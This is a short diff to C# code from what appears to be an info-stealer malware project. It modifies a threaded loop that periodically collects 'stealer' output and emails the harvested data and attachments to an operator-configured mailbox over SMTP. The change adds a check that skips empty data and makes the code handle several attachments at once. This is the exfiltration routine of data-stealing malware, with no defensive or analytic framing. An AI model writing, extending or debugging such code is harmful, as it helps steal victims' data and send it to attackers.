@@ -24,19 +24,21 @@ namespace sub.Util.Threading
                                                {
                                                    Thread.Sleep(_delay*60000);
                                                }
+                                               if (string.IsNullOrEmpty(stealer.Data)) continue;
                                                ReportEmail em = new ReportEmail(stealer.Name,
                                                                                 Program.Settings.EmailAddress,
                                                                                 Program.Settings.EmailPassword,
                                                                                 Program.Settings.SmtpAddress,
                                                                                 Program.Settings.SmtpPort);
-                                               if (stealer.Attachment == null)
+                                               if (stealer.Attachments == null)
                                                {
                                                    em.Send(stealer.Data);
                                                } else
                                                {
-                                                   em.Send(stealer.Data, stealer.Attachment);
+                                                   em.Send(stealer.Data, stealer.Attachments);
                                                }
                                                stealer.Data = null;
+                                               stealer.Attachments = null;
                                                if (runOnce)
                                                {
                                                    _stealer.Abort();
